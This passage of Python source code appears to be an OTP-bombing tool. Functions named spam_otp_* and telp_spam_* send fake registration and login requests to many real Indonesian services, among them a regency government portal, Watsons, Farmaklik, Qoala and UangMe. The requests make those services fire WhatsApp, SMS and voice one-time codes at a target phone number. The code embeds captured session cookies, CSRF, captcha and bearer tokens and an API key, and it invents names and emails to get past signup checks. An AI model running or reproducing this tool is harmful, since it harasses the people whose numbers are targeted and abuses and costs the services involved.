        last = ['Santoso', 'Wijaya', 'Kusuma', 'Pratama', 'Sari', 'Putri', 'Rahayu', 'Wibowo']
        nama = f'{random.choice(first)} {random.choice(last)}'
        user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        email = f"{user}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])}"

        url = 'https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id'

        headers = {
            'accept': '*/*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'langcode': 'id',
            'origin': 'https://gritero.com',
            'referer': 'https://gritero.com/',
            'source': 'ocistok',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'xid': '2995761938'
        }

        payload = {
            'nama_lengkap': nama,
            'email': email,
            'telepon': nomor_lokal
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False

def spam_otp_toss(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        if not phone.startswith('0'):
            phone = '0' + phone

        import subprocess
        import json
        import random

        nik = ''.join([str(random.randint(0,9)) for _ in range(16)])
        token = "0LCXtW6VhWNOQviT5Oymo2xj1JQp5meEhaF2AhBq"

        curl_cmd = f"""curl -s -X POST 'https://toss.tubankab.go.id/register/otp/act' \\
  -H 'host: toss.tubankab.go.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: */*' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://toss.tubankab.go.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://toss.tubankab.go.id/register' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _ga=GA1.1.186516799.1783490717; _ga_QEWBPVNKLP=GS2.1.s1783490717$o1$g1$t1783490775$j2$l0$h0; _ga_LKLNRLDY51=GS2.1.s1783490717$o1$g1$t1783490775$j2$l0$h0; _ga_T5R13XZX0L=GS2.1.s1783490718$o1$g1$t1783490775$j3$l0$h0; XSRF-TOKEN=eyJpdiI6IjhWYUZzM0xQeDhXT3dGQmNkem5pUFE9PSIsInZhbHVlIjoic3Y2UGJBZG1wQklPb1JHN2lTNGtWbWFBSENaSUxIOHIzT2Uzb3VQeTBkZ3ZNNStsVmNpczlRMWcvTFJxdGdLcUNLMWJqTlBocE5OcnFxdE9XMUVsUzg4Q0xHUlZxejRoUUwzMEhUUUlEVU9BSTgzL3VPbUhVTFVuQlg1bDgwMEsiLCJtYWMiOiJlZjlmNDBmMDlmNzlmM2JiYjAxNmI4NWQ5ZDc5MTJjNTkyNDA1YWU1ZmI3M2E3ZjM1NWQ3NDQ0NTc3NjlmYWRhIiwidGFnIjoiIn0%3D; toss_session=eyJpdiI6InRsZHQyL093OEtqTlVENlVkUjZTUWc9PSIsInZhbHVlIjoiRXpsb2diL1d1L0Exa01wbkNWSytvY1dXNU41SExyakZSS2hEVEpnclpkeml4UlcxMmlkVjQrOG9lQ2JpY3drREwyc24vTUdVb1daMDdwWXczdCtxMFVndmkrM3dWV2w2ZXV6SHBJZStUcGdjUG5CbkEwTU0wUmI4Z3d5eFJWekUiLCJtYWMiOiI0MDYwZTI1YzIzMWZlNDJmYjNmZTc3Y2U5OTc0MmQ2OWE1MzIzOGUyYWQ2MDI0YjM0MTdjZDg5YjJjYmU0ZTYxIiwidGFnIjoiIn0%3D' \\
  -H 'priority: u=1, i' \\
  --data-raw 'nik={nik}&nohp={phone}&_token={token}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_topindosms(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        import uuid
        import time

        uuid_device = str(uuid.uuid4())

        url = 'https://mobileapps.topindoku.co.id/api/v3/topindoku/helper/auth/register-via-web/otp/request'

        headers = {
            'Host': 'mobileapps.topindoku.co.id',
            'sec-ch-ua-platform': '"Android"',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'Content-Type': 'application/json',
            'sec-ch-ua-mobile': '?1',
            'uuid': uuid_device,
            'Origin': 'https://mitra.topindoku.co.id',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }

        payload = {
            "phone": phone,
            "via": "SMS",
            "hash": "gruenbf12d2",
            "fbc": "",
            "fbp": "fb.2.1784860943418.959857478235602163",
            "event_source_url": "https://mitra.topindoku.co.id/pendaftaran-mitra/?source=organic&referral=MTPD"
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False

def spam_otp_toss2(nomor):
    try:
        if nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        session = requests.Session()
        headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}

        resp = session.get('https://toss.tubankab.go.id/register', headers=headers)

        import re
        match = re.search("'_token':\\s*'([^']+)'", resp.text)
        if match:
            csrf = match.group(1)
            url = 'https://toss.tubankab.go.id/register/otp/act'
            headers_post = {
                **headers,
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://toss.tubankab.go.id',
                'referer': 'https://toss.tubankab.go.id/register',
                'x-requested-with': 'XMLHttpRequest'
            }
            data = f'nohp={nomor_lokal}&_token={csrf}'
            resp2 = session.post(url, headers=headers_post, data=data, timeout=10)
            return resp2.status_code < 400
        else:
            return False

    except Exception as e:
        return False

def spam_otp_farmaklik(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra']
        nama_r = f'{random.choice(first)} {random.choice(last)}'
        email = f'{spam_otp_codex(10)}@gmail.com'
        password = 'Yanto1234'

        session = requests.Session()

        # Step 1: Register
        url_reg = 'https://farmaklik-pos-api-main-784468809835.asia-southeast1.run.app/auth/register'
        r1 = session.post(url_reg, 
            json={
                'phone': nomor_lokal,
                'name': nama_r,
                'email': email,
                'password': password,
                'password_confirmation': password
            },
            headers={'Content-Type': 'application/json'},
            timeout=10
        )

        custom_token = r1.json().get('token')
        if not custom_token:
            return False

        # Step 2: Sign in with custom token
        url_sign = 'https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=AIzaSyDip_k5QiYuEVeuvevdVsT3Z7wC4CKUqNo'
        r2 = requests.post(url_sign,
            json={'token': custom_token, 'returnSecureToken': True},
            headers={'Content-Type': 'application/json'},
            timeout=10
        )

        id_token = r2.json().get('idToken')
        if not id_token:
            return False

        # Step 3: Request OTP
        url_otp = 'https://farmaklik-pos-api-main-784468809835.asia-southeast1.run.app/auth/otp-request'
        r3 = session.post(url_otp,
            json={'phone': nomor_lokal},
            headers={
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {id_token}'
            },
            timeout=10
        )

        return r3.status_code < 400

    except Exception as e:
        return False


def spam_otp_nutriclub(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        else:
            nomor = '0' + nomor

        session = requests.Session()

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-length': '0',
            'origin': 'https://www.nutriclub.co.id',
            'priority': 'u=1, i',
            'referer': 'https://www.nutriclub.co.id/membership/api/otp',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }

        params = {
            'phone': nomor,
            'old_phone': nomor
        }

        url = 'https://www.nutriclub.co.id/membership/otp/'

        resp = session.post(url, params=params, headers=headers, timeout=10)

        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get('status') == 'success' or data.get('success') == True:
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False



def spam_otp_eci_signup(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        session = requests.Session()
        url = 'https://eci.id/api/signup'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/json',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'origin': 'https://eci.id',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': f'https://eci.id/verification?step=1&phone={nomor_lokal}',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i'
        }
        payload = {
            'turnstileToken': '1.FlcZTt4urBFodA8TZgMg=m=DObW7j9Z=9ljSOZWqdw0rkO3-0CavmsR35HGXFDP5xbkhY=yut_hkEYPtKxwNKaM8z_jn5zdWU9C666R56-82_uktbsyleZJMpKUXJ5O_YyzWHthYrUWhIYKN7OG8nFSPxail9hc18AvjBCJD4vg1xb2YNd8fGuCQ9MKz2LKHCu9pveTr_RUFARHZnoJ80H81lpDvQksoWQw5nk3BQY3ow38HgtaQ5y0h=DOuDgWlqnivmrFHMWYnuy3fvSd3emtZYzEZq=q=rq3rbGFYx=85MSFYyyq1ZxWz-5EENA4Q-MmiJr0z3eObaAWz-kPf-m0InGCqN2BiXfOujiTTBKzH_s-3InGwlRMr_ZwmDB5IkLxj1hwasIm3oIqe919oT9mNdGEGMA-ubZI=tYkyRyYuXpdnqLMqBh8cJ_lGkh=1QSZzEP3k27Zks3NLIJ28R5Dzk-ThGzdre-iQZgu2mCgnMAFPqCWH-ejkNfdL-NxgDd-0bLjxSSB2AoG130UMtR30XLcYvHh4FX5tuZeeFtbUrxl3v85tdzRQpBdWaEZJ2-eQqp6ET6RfQwgxIgAhFPwQIBFYlb5EdEI8TgH78qQzg4d7kyCrPaYBhl-qoOBPDA4ysvsaE7ayn41eM5sWqNkqG3t8kvG8m34n9d5oU7ED0L3wT3URKzSK72SSqnYTt_X2CQ3S9KBvA2Cq8syraA.0heD=_uESO3xDmE3-HbXgA.e10116f3a7254d476591ce86f5c00f1c19d0df489842937533a3fdd475c30e5a',
            'identity': nomor_lokal,
            'with': 'whatsapp'
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False

def spam_otp_eci(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        session = requests.Session()
        url = 'https://eci.id/api/resend-otp'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/json',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'origin': 'https://eci.id',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': f'https://eci.id/verification?step=1&phone={nomor_lokal}',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i'
        }
        payload = {
            'identity': nomor_lokal,
            'with': 'sms'
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False


def spam_otp_qoalaplus(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = '62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor_lokal = nomor
        elif nomor.startswith('+62'):
            nomor_lokal = nomor[1:]
        else:
            nomor_lokal = '62' + nomor

        session = requests.Session()
        url = 'https://api.qoalaplus.com/agent/v2/user/generate-otp'

        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/json',
            'sec-ch-ua-platform': '"Android"',
            'x-captcha-token': '0cAFcWeA5Msfa315E_l3hhB_yhZWBucSRsWe0q3TeQ4NLqjnuP4GBurA-Z8oi0ayEn8f6Ehq_odxZQozwHqrrNO32apO7ssYbpOr2f04zXSKuvtDhWpkOE_8lNhgE_Ruo7s6UmHOyLZhevGULgBfpqwTJoojmlbJrvSZqjRHyYTpgvIzgWLuNeFp2ehmkcTCD1nfArs=aW27ses0tj8sbKaPUcpN1jZbOzUDMXFRLIAc46DOwwUbDgK4ff=G=Du98xvEMktu2uFPmzz4FbMCOeKM94RYsN6UvlpslTLu2F=zjDNJWygMCG375e54sNnoTKfroN7ERbEpcEj15fDusyb3EXDH8TinONhqEaj=b2f=kvJnfML37lFfnka=0YU0Z4zyCr7WZYmE67kzE6d=UUdS9_1PJW1ZEU09dLKDqvxoPFoiwh7OZGEAMwC9HtT16wvgAD6c1He4=YIjXhrOf2gXFLjSjMixQr6fJJ5Tubrq4gmWL9C1QHcFCxfBTvKu8=HAJRDtztwjHHd6hvLStf=4EDewqXmyFWq9BXUotTqf8xrFql887UvmnJtw6E0v2OZf2P8wPY7fqmLbkALwyksrS8tXfmq6nTFS4oCqbmBZss82Dnj7K0YCHSnlSw=gei2mGU-TIQ2uZ510jWwyDZBKQEZ936zMr=WAvz4q3oP9GqUrA4OMogY0xrPQkcGN00EEP3NTqPXi9l2LcyK8l3uo43RHYmjrLjTGPWBOHKuZzLKhQnsTGYC1xgbuKz3EOG34Tg5rvCcvAAjrSuERsMR7PEy44jBXeGGQSjCEmToX6AwT6_OKpiYHcgRrBAUR03tcS7CD260ub5AbdrIfq8koUKZ=W0T4AbMsbTNks1bztI9tqo3dbRntAEMq=UZKe0SlymOqDOWOLcxG1JPJ24lka9DxmPvfjxDCQqsYWXhFbaIBHgot7w0Uxv9=BjoPzNieL4fJWpOzONbuiXCJ3Lzj8CBhjq-2F=msvW_D=ECoEh0WQjodXSeHxihipJZDP-_akE0WNz=D2=sDCGE8hv=T-2Yyt1_m7aWKtZtPunsq8KT8MKWdzmsMNFnH-56kKrxrQr7upZEgNSMBhm8I6s0ZDExkZ7HwSKKp8PfjGDRhw1si8GceaXReBt0-z-oyWfcoEqx5WiP9SKLaXd1A4kiZ4f8pXSKsM4rkSjpXJr6PAjzMRPBXGeyzwIfsSBA2Fnu_2Ltq64FEKq76IOI9o_mKaJCEMdGLBBDwgAOTKReju6J=8Gb3kC9FNsp9TRuHTUZyGKJWK_-3sMdKnuLJtTofD6aD5LCiNahFCsaWMZOGhqPXx_ohhCI5FME45mKDNZC8wa2lbbZN3TrufssyZb1diZBD7AfmZwSgvlO0hpl5jEqJh2ZpmKzS-zE6qbe3SQzhUZ9hc36A97ob0LER3UqYPlkjr6X=ZQM1btQSi5D6ZRYrwMK6D4nHZ2LURllhT2yWvu-DNhP_0U=TboFfp0ll0DP0p-5TK=b0fLWpi9gJFde-q7GCW83=MWjo5vAcMirjjtccQIW88BqmfbyPJomugOJlB4ZAitA74zK_ByU6H7vTJ0QfUWcU2eUms3n1jxTd8O6tSYbWWLK_=0hQ3xp_-UBUf39eGU=8mGFu=LLzKB3aUY40M6Np7H=vc05vs7Z2CPLCl5eM9xEg5YPbb_B3ykUAFlrB_9Panf6OeRpf5mBD-DbffwO1SYz46jtjSabA6QPgTN1k0YCYR2nMH8RN4rylj9dlrCEgR=LGLRqrM3GOl7QRZoZcl0NbFAAW0dwFlXfw6dPpX6uYidl0lUPJoTNPpwUNwRSRSN_vDg3_C7r2Wym1GNz8fPOQ2W6sJLYzJ4Eo_sctZT-Gjla=RkY_=Ho1A4ywvjhLz-4qEYK0zOpF-xcNEfYxiCIibPFaKK_Z9sZoozdUHiFTCCYIKbqqa7HuwEops9xmMPn6ijdroeDj2dhpQCsZnJwBfx91YZUwOmWMbR2X4slI1KQ9u7tShEs8cxmwrkyDDJchk7c8O9kHz9-MXPt00AEBEfC8a_qemRqoGZgwT5=2NUTAC6g15cqPeahdqKps1Qex_-iAFCaFwNRIU7JkaX9KjjLndKktdmbwwjOFfZlzsL_CxQRkuAAEJASI6jk9a-XhnJTpF7yD8-LhQUP83INxx0D0du=R-dG9QWaRp2IKdo0N1KRYf9Yn2vGNkd=MIJmfTDZARyiqFR7NRpWs=j-BB-WS9Q-o5kry76vLx2z6Tp9M8avujOetw6SCFbxjEJMRcvebxhudJfjnLxYYpX=2pWujuLEDaT3INF4lgEYUBMzaqxIm1iQ3k5hK_wHA',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'origin': 'https://www.qoalaplus.com',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.qoalaplus.com/',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i'
        }
        payload = {
            'channel': 'WA',
            'usecase': 'REGISTRATION',
            'data': f'+{nomor_lokal}'
        }

        resp = session.patch(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False

def spam_otp_singa_yoi(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        else:
            if nomor.startswith('+62'):
                nomor = nomor[1:]
            else:
                if not nomor.startswith('62'):
                    nomor = '62' + nomor
        session = requests.Session()
        headers = {'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36'}
        resp = session.post('https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.7&versionCode=143&model=SM-S928B&systemVersion=14&platform=android&appsflyer_id=', json={'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}, headers=headers, timeout=10)
        return spam_otp_nilai(resp.text, '\"msg\":\"', '\"') == 'Success'
    except:
        return False


def spam_otp_uangme(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        else:
            nomor = nomor

        import time
        import random
        import uuid

        gaid = f"gaid_{str(uuid.uuid4())}"
        android_id = ''.join(random.choices('0123456789abcdef', k=16))

        url = 'https://api.uangme.com/api/v2/sms_code'

        params = {
            'phone': nomor,
            'scene_type': 'login',
            'send_type': 'wp'
        }

        headers = {
            'country': '510',
            'os': '1',
            'app_version': '400100',
            'ns': 'wifi',
            'gaid': gaid,
            'tz': 'Asia%2FMakassar',
            'fcm_reg_id': 'dgLeExmFSt-W-8YDYJSaxB:APA91bERax3q5c6JU2oiumkLMK8N1yLD3GA2xkdtZ9wsrFyNLT4iZmh1eDuxNABJJk55MU7N_2FJozqEdavrNqnZtPYBuEaytJspxcRgXuFXY4IBneS1k1A',
            'version': '34',
            'dfp': '0928585853654C1917E73C692285580D',
            'carrier': '11',
            'v': '1',
            'lan': 'in_ID',
            'model': 'Infinix%20X6532C',
            'android_id': android_id,
            'brand': 'Infinix',
            'aid': gaid,
            'timestamp': str(int(time.time())),
            'Host': 'api.uangme.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'User-Agent': 'okhttp/3.12.1'
        }

        resp = requests.get(url, params=params, headers=headers, timeout=10)

        if resp.status_code == 200:
            try:
                data = resp.json()
                return data.get('code') == 0 or data.get('success') == True
            except:
                return 'success' in resp.text.lower()
        return False

    except Exception as e:
        return False


def telp_spam_jogjakita(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:] 
        session = requests.Session()
        auth_resp = session.post('https://aci-user.bmsecure.id/oauth/token', data={'grant_type': 'client_credentials', 'uuid': '00000000-0000-0000-0000-000000000000', 'id_user': '0', 'id_kota': '0', 'location': '0.0,0.0', 'via': 'jogjakita_user', 'version_code': '501', 'version_name': '6.10.1'}, headers={'authorization': 'Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'okhttp/4.10.0'}, timeout=10)
        token = auth_resp.json().get('access_token')
        if not token:
            return False
        resp = session.post('https://aci-user.bmsecure.id/v2/user/signin-otp/voice/send', json={'phone_user': nomor, 'primary_credential': {'device_id': '', 'fcm_token': '', 'id_kota': 0, 'id_user': 0, 'location': '0.0,0.0', 'uuid': '', 'version_code': '501', 'version_name': '6.10.1', 'via': 'jogjakita_user'}, 'uuid': '00000000-4c22-250d-3006-9a465f072739', 'version_code': '501', 'version_name': '6.10.1', 'via': 'jogjakita_user'}, headers={'Content-Type': 'application/json; charset=UTF-8', 'Authorization': f'Bearer {token}'}, timeout=10)
        return resp.json().get('rc') == 200
    except:
        return False


def spam_otp_fastwork(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"

        headers = {
            "Content-Type": "application/json",
            "Origin": "https://fastwork.id",
            "Referer": "https://fastwork.id/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"
        }

        payload = {
            "phone_number": phone,
            "country_code": "62",
            "type": "whatsapp"
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_sms_optikmelawai(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor

        url = "https://api.optikmelawai.com/api/v2/auth/register/verify/phone/request"
        headers = {
            "Content-Type": "application/json",
            "Authorization": "Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d11f083077e562169b78d2ef2f3d285542a22f5ae174badd1313593deb5ec4389c75de38055b4964969a8323f031d47a6b35b3af4a096a08d6dddc2bf616c36bbeea1602b5b8a041650909107c207ed9",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://www.optikmelawai.com",
            "Referer": "https://www.optikmelawai.com/",
            "Accept": "application/json",
            "Language": "id"
        }
        payload = {
            "value": nomor,
            "provider": "mobile_number"
        }
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def spam_otp_mapclub_wa(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]

        token = 'eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiJhZmFkMTJlMS04ODk0LTQyOTMtOThkMy1iYmM5M2Y4N2ExZDAiLCJleHBpcmVkIjoxNzgyOTc2NDIxNzE1LCJleHBpcmUiOjM2MDAsImV4cCI6MTc4Mjk3NjQyMSwiaWF0IjoxNzgyOTcyODIxLCJwbGF0Zm9ybSI6IldFQiJ9.1-V0QBbQsXsOxrg7gwaoKzsN-WJIrzb4Qao64pxz50thAZ1m6byXeSbmRjerAkMdMzgdVH7NSknlwfyAXFbB9g'

        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'in-ID',
            'authorization': f'Bearer {token}',
            'client-platform': 'WEB',
            'client-timestamp': str(int(time.time() * 1000)),
            'content-type': 'application/json',
            'origin': 'https://www.mapclub.com',
            'referer': 'https://www.mapclub.com/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
        }

        payload = {
            "account": nomor,
            "prefix": "62"
        }

        url = 'https://beryllium.mapclub.com/api/member/registration/sms/otp'
        params = {'channel': 'WHATSAPP'}

        response = requests.post(url, headers=headers, json=payload, params=params, timeout=15)
        return response.status_code == 200

    except Exception as e:
        return False

def spam_otp_watsons(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]

        session = requests.Session()

        headers = {
            'Host': 'api.watsons.co.id',
            'Connection': 'keep-alive',
            'cache-control': 'no-cache, no-store, must-revalidate, post-check=0, pre-check=0',
            'sec-ch-ua-platform': '"Android"',
            'authorization': 'bearer 0Sv-5cyRFTYMcXj-qh92vqC1WQ4',
            'pragma': 'no-cache',
            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile': '?1',
            'expires': '0',
            'queue-target': 'https://www.watsons.co.id/id/register',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'vary': '*',
            'origin': 'https://www.watsons.co.id',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.watsons.co.id/',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i'
        }

        otp_payload = {
            "uid": "",
            "action": "GENERAL",
            "countryCode": "62",
            "target": nomor,
            "type": "WHATSAPP"
        }

        otp_url = 'https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR'

        resp_otp = session.post(otp_url, json=otp_payload, headers=headers, timeout=15)

        if resp_otp.status_code == 200:
            try:
                data = resp_otp.json()
                if data.get('status') == 'success' or data.get('success') == True:
                    return True
